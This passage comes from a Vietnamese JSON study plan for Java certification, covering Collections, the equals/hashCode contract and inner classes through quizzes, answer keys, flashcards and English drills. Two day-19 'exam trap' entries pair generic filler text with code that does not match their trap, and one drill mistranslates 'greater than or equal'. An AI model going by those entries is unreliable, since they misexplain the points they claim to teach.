          "desc": "Trace sắp xếp TreeSet và Comparable",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nSet<String> set = new TreeSet<>();\nset.add(\"Banana\");\nset.add(\"Apple\");\nset.add(\"Banana\");\nSystem.out.println(set);\n```\nKết quả in ra là gì?",
              "ans": "In ra: `[Apple, Banana]`. `TreeSet` tự động sắp xếp các phần tử theo thứ tự tự nhiên (tăng dần bảng chữ cái với String) và tự động loại bỏ phần tử trùng lặp 'Banana'."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy TreeSet chứa phần tử không implements Comparable",
          "questions": [
            {
              "q": "Đoạn code sau xảy ra lỗi gì lúc chạy?\n```java\nclass Person { String name; Person(String n) { name = n; } }\nSet<Person> set = new TreeSet<>();\nset.add(new Person(\"Alice\"));\n```",
              "ans": "Ném ngoại lệ `java.lang.ClassCastException: Person cannot be cast to java.lang.Comparable` khi chạy hàm `add()`. `TreeSet` bắt buộc các phần tử phải implements interface `Comparable` hoặc cung cấp một `Comparator` khi khởi tạo Set."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "CopyOnWriteArrayList trong môi trường đa luồng",
          "questions": [
            {
              "q": "Tại sao duyệt qua một `ArrayList` thông thường trong khi một luồng khác gọi `add()` lại ném `ConcurrentModificationException`, và giải pháp trong package `java.util.concurrent` là gì?",
              "ans": "Do cơ chế fail-fast kiểm tra `modCount`. Giải pháp là sử dụng `CopyOnWriteArrayList` (mỗi thao tác ghi sẽ clone một mảng mới, các luồng đọc không bị block và không bao giờ ném `ConcurrentModificationException`)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_17_1",
          "q": "Cấu trúc dữ liệu nào sau đây KHÔNG THỂ chứa các phần tử trùng lặp (Duplicate elements)?",
          "options": [
            "Set",
            "List",
            "Queue",
            "ArrayList"
          ],
          "correct": 0,
          "exp": "Interface Set đại diện cho tập hợp toán học, đảm bảo mọi phần tử bên trong là duy nhất, không cho phép trùng lặp."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "So sánh cấu trúc dữ liệu và độ phức tạp của `ArrayList` vs `LinkedList`?",
          "a": "- `ArrayList`: Dùng mảng động (`Object[]`), truy xuất ngẫu nhiên theo index cực nhanh O(1), nhưng chèn/xóa ở giữa mảng chậm O(n) do phải dời mảng.\n- `LinkedList`: Dùng danh sách liên kết đôi (Doubly-linked list), chèn/xóa đầu/cuối nhanh O(1), nhưng truy xuất index chậm O(n) vì phải duyệt tuần tự.",
          "trap": "Truy cập phần tử thường xuyên bằng get(i) thì ArrayList luôn tối ưu hơn nhiều so với LinkedList."
        },
        {
          "q": "Đặc điểm khác biệt giữa 3 implementation của Set: `HashSet`, `LinkedHashSet`, `TreeSet`?",
          "a": "- `HashSet`: Dùng bảng băm, không đảm bảo thứ tự các phần tử, cho phép 1 phần tử `null`.\n- `LinkedHashSet`: Dùng bảng băm kết hợp linked list, bảo toàn THỨ TỰ CHÈN (insertion-order).\n- `TreeSet`: Dùng cây đỏ-đen, tự động sắp xếp phần tử theo THỨ TỰ TỰ NHIÊN hoặc Comparator, KHÔNG CHO PHÉP `null`.",
          "trap": "Thêm `null` vào `TreeSet` sẽ bị ném ngay ngoại lệ `NullPointerException`!"
        },
        {
          "q": "Sự khác biệt giữa `Collection` (interface) và `Collections` (class)?",
          "a": "`Collection` là root interface cấp cao trong Java Collections Framework. `Collections` là một Utility Class (chứa toàn các phương thức `static` như `sort()`, `reverse()`, `binarySearch()`, `unmodifiableList()`).",
          "trap": "Đề thi hỏi interface nào có method sort() -> Đáp án là List (từ Java 8), không phải Collection!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 49,
          "vi": "-Hàm delete 1 đối tượng đang hiển thị trên màn hình  khi người dùng button xxx",
          "en": "Function of deleting1 object which show on screen when  user click button xxx"
        },
        {
          "id": 50,
          "vi": "-Hàm thực hiện lọc theo yes/no khi người dùng checke/uncheck vào checkbox",
          "en": "Function of filtering by yes/no when user chooses check/uncheck into checkbox"
        },
        {
          "id": 51,
          "vi": "Chuyển đến trang ABC khi người dùng click button xxx",
          "en": "forward to ABC page when user clicks button xxx"
        },
        {
          "id": 52,
          "vi": "kiểm tra 1 dòng dữ liệu tồn tại trong cơ sở dữ liệu  thỏa mãn điều kiện trận đấu đó là trận đấu  gần nhất của 1 cặp thi đấu",
          "en": "Check 1 data row which exists in database, satisfying match conditions"
        },
        {
          "id": 53,
          "vi": "Tìm những cặp đấu đã từng thi đấu  với nhau ít nhất 2 lần",
          "en": "Search matches which have at least 2 times of competitions"
        }
      ],
      "chapter": "Chapter 7: Collections Framework (List, Set, Queue)"
    },
    "18": {
      "day": 18,
      "week": 3,
      "title": "Chapter 7: Collections Framework (Phần 2) & equals/hashCode",
      "topics": [
        "Map interface: HashMap, Hashtable, TreeMap, LinkedHashMap (Map KHÔNG kế thừa Collection)",
        "equals() & hashCode() contract: tại sao phải override cả 2?",
        "Garbage Collection: System.gc(), finalize(), khi nào object eligible for GC?"
      ],
      "tasks": [
        "Vẽ cơ chế hoạt động của HashMap (bucket, hash, equals, collision)",
        "Làm 30 câu TestKing Ch7"
      ],
      "englishDrill": [
        {
          "id": 52,
          "vi": "kiểm tra 1 dòng dữ liệu tồn tại trong cơ sở dữ liệu  thỏa mãn điều kiện trận đấu đó là trận đấu  gần nhất của 1 cặp thi đấu",
          "en": "Check 1 data row which exists in database, satisfying match conditions"
        },
        {
          "id": 53,
          "vi": "Tìm những cặp đấu đã từng thi đấu  với nhau ít nhất 2 lần",
          "en": "Search matches which have at least 2 times of competitions"
        },
        {
          "id": 54,
          "vi": "So sánh ngày thi đấu gần nhất với ngày  chuẩn bị chèn vào cơ sở dữ liệu",
          "en": "Compare the nearest match date with the inserted date in database"
        },
        {
          "id": 55,
          "vi": "mã trận đấu nên theo định dạng sau  ( không bắt buộc)",
          "en": "Match code should be in following format (un-required)"
        },
        {
          "id": 56,
          "vi": "Nếu A lớn hơn hoặc bằng B thì thực hiện update ngược lại  thì thông báo lỗi",
          "en": "If A is greater than B,  update, else, report errors"
        }
      ],
      "summary": "Chapter 7: Collections (Phần 2) - Map & Hợp đồng equals() / hashCode() & Garbage Collection.",
      "coreTheory": "\n### 1. Map Interface (Key-Value)\n- `HashMap`: Cho phép 1 key `null` và nhiều value `null`. Non-thread-safe.\n- `Hashtable`: Cổ điển, synchronized, **KHÔNG CHO PHÉP bất kỳ key hoặc value null nào** (ném NullPointerException).\n- `TreeMap`: Key được sắp xếp có thứ tự, key không được null.\n\n### 2. Hợp đồng equals() và hashCode()\n- Nếu `o1.equals(o2) == true` $\\rightarrow$ Bắt buộc `o1.hashCode() == o2.hashCode()`.\n- Nếu override `equals()`, **BẮT BUỘC phải override `hashCode()`**.\n- Nếu quên override hashCode: HashMap không thể tìm thấy phần tử khi gọi `get(key)` vì mã hash bị lệch bucket!\n\n### 3. Garbage Collection (GC)\n- Đối tượng đủ điều kiện bị dọn rác khi không còn bất kỳ biến tham chiếu trực tiếp/gián tiếp nào trỏ tới nó (Unreachable).\n- `System.gc()` chỉ là lời gợi ý cho JVM, không đảm bảo GC sẽ chạy ngay.\n",
      "codeSnippet": "Map<String, Integer> map = new HashMap<>();\nmap.put(null, 100); // Hợp lệ trong HashMap!\n\nMap<String, Integer> table = new Hashtable<>();\n// table.put(null, 100); // RUNTIME ERROR: NullPointerException!",
      "traps": [
        "Hashtable không cho phép null key lẫn null value.",
        "Quên hashCode() làm mất dữ liệu trong HashMap/HashSet."
      ],
      "quickQuiz": [
        {
          "q": "Hai object có hashCode bằng nhau thì equals có chắc bằng nhau không?",
          "a": "Không (đây là hiện tượng đụng độ hash - Collision)."
        }
      ],
      "estimatedTime": "3h 30m",
      "difficulty": "⭐⭐⭐⭐",
      "priority": "🔴 MUST KNOW (Trọng Tâm Audit & Phỏng Vấn)",
      "source": "SCJP Chapter 7 (ch07.pdf) & TestKing",
      "objectives": [
        "Hiểu sâu cơ chế bảng băm (Hash Table) và xử lý va chạm (Collision) trong HashMap.",
        "Nắm vững Hợp đồng bất biến giữa equals() và hashCode().",
        "Giải thích hiện tượng rò rỉ bộ nhớ (Memory Leak) hoặc mất dữ liệu khi dùng sai hashCode trong HashSet/HashMap.",
        "Phân biệt Comparable (tự nhiên) vs Comparator (linh hoạt)."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "partA",
          "title": "Part A: Hợp Đồng Bất Biến Giữa equals() và hashCode()",
          "sourceRef": "SCJP Objective 6.2 & 6.3 (ch07.pdf, Page 15-32)",
          "theory": "\n#### 1. Bản chất của hàm hashCode():\n- `hashCode()` trả về một số nguyên `int` đại diện cho giá trị băm của đối tượng.\n- HashMap và HashSet dùng `hashCode()` để tính toán vị trí ngăn chứa (**Bucket**) lưu trữ đối tượng: `bucketIndex = hash(key) & (capacity - 1)`.\n\n#### 2. HỢP ĐỒNG BẮT BUỘC GIỮA EQUALS & HASHCODE:\n1. **Nếu `obj1.equals(obj2) == true`**: Thì **BẮT BUỘC `obj1.hashCode() == obj2.hashCode()`**! (Hai đối tượng bình đẳng về nội dung thì bắt buộc phải có cùng mã băm).\n2. **Nếu `obj1.hashCode() == obj2.hashCode()`**: Thì `obj1.equals(obj2)` **CÓ THỂ TRUE HOẶC FALSE** (đây là hiện tượng đụng độ mã băm - **Hash Collision**).\n3. **Tính nhất quán (Consistency)**: Trong suốt vòng đời ứng dụng, nếu thuộc tính dùng để so sánh của object không đổi thì `hashCode()` gọi bao nhiêu lần cũng phải trả về cùng 1 số.\n\n#### 3. Thảm họa khi chỉ Override equals mà quên hashCode:\n- Nếu bạn tạo 2 đối tượng `Student s1 = new Student(101, \"An\");` và `Student s2 = new Student(101, \"An\");`.\n- Đã override `equals()` nên `s1.equals(s2)` là `true`.\n- Bạn đưa `map.put(s1, \"Score A\");`.\n- Khi gọi `map.get(s2)`: Do chưa override `hashCode()`, class Object tính hash dựa trên địa chỉ RAM. `s2` sinh ra hash khác `s1`, HashMap tìm ở bucket khác và trả về **`null`**!\n",
          "code": "public class Student {\n    private int id;\n    private String name;\n\n    public Student(int id, String name) { this.id = id; this.name = name; }\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Student s = (Student) o;\n        return id == s.id && Objects.equals(name, s.name);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(id, name); // BẮT BUỘC PHẢI OVERRIDE CÙNG NHAU!\n    }\n}"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d18_1",
          "level": "Hard",
          "question": "Đoạn code sau in ra màn hình giá trị kích thước của set là bao nhiêu?",
          "code": "import java.util.*;\n\nclass Item {\n    int id;\n    Item(int id) { this.id = id; }\n    public boolean equals(Object o) {\n        return (o instanceof Item) && ((Item)o).id == this.id;\n    }\n    // Không override hashCode()!\n}\n\npublic class HashTrace {\n    public static void main(String[] args) {\n        Set<Item> set = new HashSet<>();\n        set.add(new Item(1));\n        set.add(new Item(1));\n        System.out.println(set.size());\n    }\n}",
          "options": [
            "2",
            "1",
            "0",
            "Compile Error"
          ],
          "correctIndex": 0,
          "explanation": "Do class Item chỉ override `equals()` mà KHÔNG override `hashCode()`, hai đối tượng `new Item(1)` sử dụng hàm hashCode mặc định của class `Object` (dựa trên địa chỉ bộ nhớ). Hai đối tượng có hai mã băm khác nhau nên rơi vào hai bucket khác nhau trong HashSet. HashSet không cần so sánh equals và chấp nhận cả hai! Do đó kích thước in ra là 2."
        }
      ],
      "examTraps": [
        {
          "trap": "Sửa đổi thuộc tính của đối tượng sau khi đã đưa vào HashSet/HashMap",
          "whyPeopleWrong": "Nghĩ rằng Set sẽ tự động cập nhật lại vị trí của object khi thuộc tính thay đổi.",
          "wrongThinking": "Tưởng rằng set.contains(obj) hoặc set.remove(obj) vẫn hoạt động bình thường sau khi sửa thuộc tính.",
          "correctRule": "Khi sửa thuộc tính của đối tượng, mã hashCode của nó bị đổi. HashSet sẽ tìm ở bucket mới dựa trên hash mới và không thấy object đó! Kết quả là không thể xóa được object cũ, gây rò rỉ bộ nhớ (Memory Leak).",
          "code": "Person p = new Person(\"Nam\");\nset.add(p);\np.setName(\"Lan\"); // Sửa thuộc tính!\nSystem.out.println(set.contains(p)); // IN RA FALSE!",
          "miniCheck": "Luôn dùng các thuộc tính bất biến (Immutable như id final) để làm key trong HashMap/HashSet."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Hợp đồng equals() và hashCode()",
          "questions": [
            {
              "q": "Hợp đồng (Contract) bắt buộc giữa phương thức `equals()` và `hashCode()` quy định điều gì?",
              "ans": "Nếu hai đối tượng bằng nhau theo `equals()` (`a.equals(b) == true`), thì BẮT BUỘC mã băm `hashCode()` của chúng phải bằng nhau (`a.hashCode() == b.hashCode()`). Ngược lại, nếu hashCode bằng nhau thì equals CHƯA CHẮC đã bằng nhau (đụng độ băm)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Cấu trúc bên trong của HashMap",
          "questions": [
            {
              "q": "Từ Java 8, cấu trúc dữ liệu bên trong một bucket của `HashMap` thay đổi như thế nào khi số lượng phần tử vượt quá ngưỡng 8?",
              "ans": "Khi số phần tử trong 1 bucket vượt quá ngưỡng `TREEIFY_THRESHOLD = 8` (và tổng dung lượng mảng bucket >= 64), danh sách liên kết đơn (LinkedList, tìm kiếm `O(n)`) sẽ được chuyển đổi thành Cây Đỏ-Đen (Red-Black Tree, tìm kiếm `O(log n)`)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace hành vi HashMap khi không override hashCode",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nclass Key {\n    int id;\n    Key(int id) { this.id = id; }\n    public boolean equals(Object o) { return ((Key)o).id == this.id; }\n}\npublic class Test {\n    public static void main(String[] args) {\n        Map<Key, String> map = new HashMap<>();\n        map.put(new Key(1), \"One\");\n        System.out.println(map.get(new Key(1)));\n    }\n}\n```\nKết quả in ra là gì?",
              "ans": "In ra: `null`! Do class `Key` chỉ override `equals()` mà KHÔNG override `hashCode()`, hai đối tượng `new Key(1)` có 2 mã hashCode ngẫu nhiên khác nhau từ `Object.hashCode()`, rơi vào 2 bucket khác nhau nên hàm `get()` không tìm thấy phần tử."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy thay đổi trường dữ liệu sau khi put vào Map",
          "questions": [
            {
              "q": "Nếu một đối tượng được dùng làm Key trong HashMap bị sửa đổi một trường tham gia tính `hashCode()`, chuyện gì xảy ra khi gọi `map.get(key)`?",
              "ans": "Sẽ trả về `null` (mất dấu đối tượng / memory leak). Do hashCode mới bị thay đổi, HashMap sẽ tìm ở bucket mới thay vì bucket ban đầu chứa đối tượng."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "ConcurrentHashMap vs Collections.synchronizedMap",
          "questions": [
            {
              "q": "Tại sao `ConcurrentHashMap` lại có hiệu năng đọc/ghi đa luồng vượt trội hơn hẳn so với `Collections.synchronizedMap`?",
              "ans": "`synchronizedMap` khóa toàn bộ Map (table-level lock) cho mọi thao tác. `ConcurrentHashMap` (Java 8) sử dụng kỹ thuật Lock Striping kết hợp CAS (Compare-And-Swap) và chỉ đồng bộ hóa trên từng Node đầu bucket (`synchronized(node)`), cho phép nhiều luồng đọc/ghi đồng thời trên các bucket khác nhau."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_18_1",
          "q": "Nếu hai đối tượng a và b trong Java có `a.hashCode() == b.hashCode()`, điều này khẳng định điều gì?",
          "options": [
            "Hai đối tượng có thể equals hoặc không equals (xảy ra va chạm hash collision)",
            "Chắc chắn a.equals(b) phải là true",
            "Chắc chắn a.equals(b) phải là false",
            "JVM sẽ ném ngoại lệ IllegalStateException"
          ],
          "correct": 0,
          "exp": "Theo hợp đồng, hai đối tượng có cùng hashCode có thể bằng nhau hoặc khác nhau (gọi là Hash Collision). Nhưng nếu equals là true thì bắt buộc hashCode phải bằng nhau."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Quy tắc hợp đồng (Contract) bắt buộc giữa `equals()` và `hashCode()`?",
          "a": "1. Nếu `a.equals(b) == true` thì BẮT BUỘC `a.hashCode() == b.hashCode()`.\n2. Nếu `a.hashCode() == b.hashCode()` thì `a.equals(b)` có thể true hoặc false (hiện tượng Hash Collision).\n3. Do đó, hễ override `equals()` thì BẮT BUỘC phải override `hashCode()`!",
          "trap": "Nếu override equals mà quên override hashCode, khi lưu object vào `HashMap` hay `HashSet` sẽ không tìm lại được (get ra null)!"
        },
        {
          "q": "So sánh `HashMap` và `Hashtable`?",
          "a": "- `HashMap`: Không đồng bộ (non-thread-safe), nhanh hơn, cho phép 1 key `null` và nhiều value `null`.\n- `Hashtable`: Cổ điển, mọi method đều có `synchronized` (chậm), KHÔNG CHO PHÉP key null hoặc value null (ném NPE ngay).",
          "trap": "Put null key vào Hashtable -> ném NullPointerException ngay lập tức!"
        },
        {
          "q": "Map có phải là một Collection (có implements Collection interface) không?",
          "a": "KHÔNG. `Map` là một cấu trúc Key-Value độc lập hoàn toàn, không kế thừa interface `Collection`. Muốn duyệt Map phải thông qua `map.keySet()`, `map.values()`, hoặc `map.entrySet()`.",
          "trap": "Đề thi hay hỏi interface nào sau đây kế thừa Collection: List, Set, Queue, Map -> Map là đáp án SAI!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 52,
          "vi": "kiểm tra 1 dòng dữ liệu tồn tại trong cơ sở dữ liệu  thỏa mãn điều kiện trận đấu đó là trận đấu  gần nhất của 1 cặp thi đấu",
          "en": "Check 1 data row which exists in database, satisfying match conditions"
        },
        {
          "id": 53,
          "vi": "Tìm những cặp đấu đã từng thi đấu  với nhau ít nhất 2 lần",
          "en": "Search matches which have at least 2 times of competitions"
        },
        {
          "id": 54,
          "vi": "So sánh ngày thi đấu gần nhất với ngày  chuẩn bị chèn vào cơ sở dữ liệu",
          "en": "Compare the nearest match date with the inserted date in database"
        },
        {
          "id": 55,
          "vi": "mã trận đấu nên theo định dạng sau  ( không bắt buộc)",
          "en": "Match code should be in following format (un-required)"
        },
        {
          "id": 56,
          "vi": "Nếu A lớn hơn hoặc bằng B thì thực hiện update ngược lại  thì thông báo lỗi",
          "en": "If A is greater than B,  update, else, report errors"
        }
      ],
      "chapter": "Chapter 7: Collections Framework (Phần 2) & Hashing"
    },
    "19": {
      "day": 19,
      "week": 3,
      "title": "Chapter 8: Inner Classes",
      "topics": [
        "Regular Inner Class (non-static)",
        "Method-Local Inner Class (truy cập biến local final/effectively final)",
        "Anonymous Inner Class",
        "Static Nested Class"
      ],
      "tasks": [
        "Cú pháp khởi tạo: Outer.Inner in = new Outer().new Inner();",
        "Làm 20 câu TestKing Inner classes"
      ],
      "englishDrill": [
        {
          "id": 55,
          "vi": "mã trận đấu nên theo định dạng sau  ( không bắt buộc)",
          "en": "Match code should be in following format (un-required)"
        },
        {
          "id": 56,
          "vi": "Nếu A lớn hơn hoặc bằng B thì thực hiện update ngược lại  thì thông báo lỗi",
          "en": "If A is greater than B,  update, else, report errors"
        },
        {
          "id": 57,
          "vi": "Nếu A thõa mãn các điều kiện validate thì sẽ xử lý add vào object ngược lại thì thông báo lỗi",
          "en": "If A satisfies conditions of validation, add into object, else, report errors"
        },
        {
          "id": 58,
          "vi": "láy danh sách bảng theo Id abc",
          "en": "get table list by id abc"
        },
        {
          "id": 59,
          "vi": "xóa bảng với điều kiện id= abc",
          "en": "Delete table if id=abc"
        }
      ],
      "summary": "Chapter 8: Inner Classes - Member Inner, Method-Local, Anonymous & Static Nested.",
      "coreTheory": "\n### 4 Loại Inner Class trong Java:\n1. **Regular Member Inner Class:** Nằm trong class ngoài, truy cập được mọi private của class ngoài. Khởi tạo: `new Outer().new Inner()`.\n2. **Method-Local Inner Class:** Nằm trong phương thức. Chỉ truy cập được biến local nếu biến đó là `final` (hoặc effectively final).\n3. **Anonymous Inner Class:** Lớp nặc danh không tên, dùng để override nhanh method của class/interface (thường gặp trong Event Listener).\n4. **Static Nested Class:** Lớp lồng có từ khóa `static`, không giữ tham chiếu đến instance của outer class. Khởi tạo: `new Outer.StaticNested()`.\n",
      "codeSnippet": "class Outer {\n    private int x = 10;\n    class Inner {\n        void show() { System.out.println(x); } // Truy cập private x\n    }\n}\n\nOuter.Inner in = new Outer().new Inner();\nin.show(); // In ra 10",
      "traps": [
        "Method-local inner class truy cập biến local bị thay đổi giá trị sẽ bị Compile Error.",
        "Regular inner class không thể khai báo biến static trừ khi là static final hằng số."
      ],
      "quickQuiz": [
        {
          "q": "Cú pháp tạo Member Inner Class từ bên ngoài là gì?",
          "a": "new Outer().new Inner()"
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐",
      "priority": "🔴 MUST KNOW (Java Core Cốt Lõi)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Regular Inner Class (non-static), Method-Local Inner Class (truy cập biến local final/effectively final), Anonymous Inner Class.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 4 Loại Inner Class trong Java:\n1. **Regular Member Inner Class:** Nằm trong class ngoài, truy cập được mọi private của class ngoài. Khởi tạo: `new Outer().new Inner()`.\n2. **Method-Local Inner Class:** Nằm trong phương thức. Chỉ truy cập được biến local nếu biến đó là `final` (hoặc effectively final).\n3. **Anonymous Inner Class:** Lớp nặc danh không tên, dùng để override nhanh method của class/interface (thường gặp trong Event Listener).\n4. **Static Nested Class:** Lớp lồng có từ khóa `static`, không giữ tham chiếu đến instance của outer class. Khởi tạo: `new Outer.StaticNested()`.\n",
          "code": "class Outer {\n    private int x = 10;\n    class Inner {\n        void show() { System.out.println(x); } // Truy cập private x\n    }\n}\n\nOuter.Inner in = new Outer().new Inner();\nin.show(); // In ra 10"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d19_1",
          "level": "Hard",
          "question": "Dự đoán kết quả của Inner class truy cập biến ngoài sau:",
          "code": "public class OuterTrap {\n    private int x = 10;\n    class Inner {\n        private int x = 20;\n        void print() {\n            int x = 30;\n            System.out.println(x + OuterTrap.this.x);\n        }\n    }\n    public static void main(String[] args) {\n        new OuterTrap().new Inner().print();\n    }\n}",
          "options": [
            "40",
            "50",
            "30",
            "Compile Error"
          ],
          "correctIndex": 0,
          "explanation": "1. Biến `x` bên trong method `print()` là biến cục bộ có giá trị là `30`.\n2. Cú pháp `OuterTrap.this.x` tường minh truy cập biến instance `x` của lớp ngoài cùng (Outer), có giá trị là `10`.\n3. Phép cộng: `30 + 10 = 40`."
        }
      ],
      "examTraps": [
        {
          "trap": "Khởi tạo Regular Inner Class mà không có đối tượng Outer Class",
          "whyPeopleWrong": "Viết lệnh 'new Outer.Inner()' như class thông thường.",
          "wrongThinking": "Tưởng rằng inner class không static có thể tự new độc lập.",
          "correctRule": "Regular Inner Class luôn gắn chặt với 1 instance của Outer Class. Cú pháp khởi tạo đúng bắt buộc phải là: outerInstance.new InnerClass();",
          "code": "Outer out = new Outer();\nOuter.Inner in = out.new Inner(); // HỢP LỆ\n// Outer.Inner bad = new Outer.Inner(); // COMPILE ERROR: Không thể new trực tiếp không có outer instance!",
          "miniCheck": "Chỉ có Static Nested Class mới new được dạng new Outer.StaticNested();"
        },
        {
          "trap": "Cạm bẫy 1: Method-local inner class truy cập biến local bị thay đổi giá trị sẽ bị Compile Error.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "class Outer {\n    private int x = 10;\n    class Inner {\n        void show() { System.out.println(x); } // Truy cập private x\n    }\n}\n\nOuter.Inner in = new Outer().new Inner();\nin.show(); // In ra 10",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: Regular inner class không thể khai báo biến static trừ khi là static final hằng số.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "class Outer {\n    private int x = 10;\n    class Inner {\n        void show() { System.out.println(x); } // Truy cập private x\n    }\n}\n\nOuter.Inner in = new Outer().new Inner();\nin.show(); // In ra 10",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Phân loại Inner Classes",
          "questions": [
            {
              "q": "Kể tên 4 loại nested class trong Java.",
              "ans": "1) Member Inner Class, 2) Static Nested Class, 3) Method-Local Inner Class, 4) Anonymous Inner Class."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Truy cập biến Outer Class",
          "questions": [
            {
              "q": "Tại sao Method-Local Inner Class chỉ có thể truy cập biến cục bộ của phương thức khi biến đó là `final` hoặc `effectively final`?",
              "ans": "Vì vòng đời của biến cục bộ kết thúc khi hàm kết thúc (giải phóng trên Stack), trong khi đối tượng inner class có thể sống lâu hơn trên Heap. Java sao chép bản copy của biến vào inner class; việc bắt buộc `final` đảm bảo giá trị hai bên luôn đồng nhất."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace cú pháp khởi tạo Inner Class",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nclass Outer {\n    int x = 10;\n    class Inner {\n        int x = 20;\n        void print() { System.out.println(Outer.this.x + \" \" + this.x); }\n    }\n}\npublic class Test {\n    public static void main(String[] args) {\n        Outer.Inner in = new Outer().new Inner();\n        in.print();\n    }\n}\n```\nKết quả in ra là gì?",
              "ans": "In ra: `10 20`. `Outer.this.x` tham chiếu tường minh tới biến `x` của đối tượng lớp ngoài (10), còn `this.x` tham chiếu tới biến `x` của đối tượng lớp trong (20)."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy khởi tạo Static Nested Class",
          "questions": [
            {
              "q": "Để khởi tạo đối tượng của `static class Nested` nằm trong `class Outer`, cú pháp nào là đúng: `new Outer().new Nested()` hay `new Outer.Nested()`?",
              "ans": "Cú pháp đúng là `new Outer.Nested()`. Static Nested Class không phụ thuộc vào bất kỳ instance nào của lớp ngoài, do đó không dùng cú pháp `outerInstance.new`."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Anonymous Inner Class và đa kế thừa",
          "questions": [
            {
              "q": "Một Anonymous Inner Class có thể vừa `extends` một class vừa `implements` một interface không?",
              "ans": "Không thể! Anonymous Inner Class chỉ có thể kế thừa từ ĐÚNG MỘT class HOẶC thực thi ĐÚNG MỘT interface tại thời điểm khởi tạo."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_19_1",
          "q": "Một Method-Local Inner Class (class nằm trong phương thức) muốn truy cập biến cục bộ của phương thức đó thì biến cục bộ bắt buộc phải có tính chất gì?",
          "options": [
            "Phải là hằng số final (hoặc effectively final từ Java 8)",
            "Phải là biến static",
            "Phải là biến public",
            "Phải có kiểu dữ liệu nguyên thủy"
          ],
          "correct": 0,
          "exp": "Biến cục bộ nằm trên Stack và bị hủy khi method kết thúc, trong khi đối tượng Inner Class nằm trên Heap và có thể sống lâu hơn. Java copy giá trị biến đó vào inner class, do đó biến bắt buộc phải là final (hoặc effectively final) để đảm bảo tính nhất quán dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Cách tạo một instance của Member Inner Class (non-static) từ bên ngoài lớp cha?",
          "a": "Bắt buộc phải có một instance của Outer class trước: `Outer out = new Outer(); Outer.Inner in = out.new Inner();` hoặc viết gọn `new Outer().new Inner();`.",
          "trap": "Không thể gọi trực tiếp `new Outer.Inner()` nếu Inner không có từ khóa `static`!"
        },
        {
          "q": "Static Nested Class có điểm gì khác biệt so với Regular Inner Class?",
          "a": "Static Nested Class không gắn liền với một instance cụ thể nào của Outer, có thể khởi tạo trực tiếp: `new Outer.StaticNested();`. Nó chỉ có thể truy cập các thành viên `static` của Outer, không truy cập được biến instance của Outer.",
          "trap": "Static Nested Class không ngầm giữ tham chiếu đến outer object, giúp tránh memory leak."
        },
        {
          "q": "Local Inner Class (trong method) có thể truy cập các biến local của method với điều kiện gì?",
          "a": "Các biến local trong method được inner class truy cập BẮT BUỘC phải là `final` hoặc có tính chất Effectively Final (không bị gán lại giá trị sau khi khởi tạo).",
          "trap": "Nếu biến local bị thay đổi giá trị ở dòng code phía sau, compiler sẽ báo lỗi ngay tại chỗ inner class sử dụng nó."
        }
      ],
      "dailyEnglish": [
        {
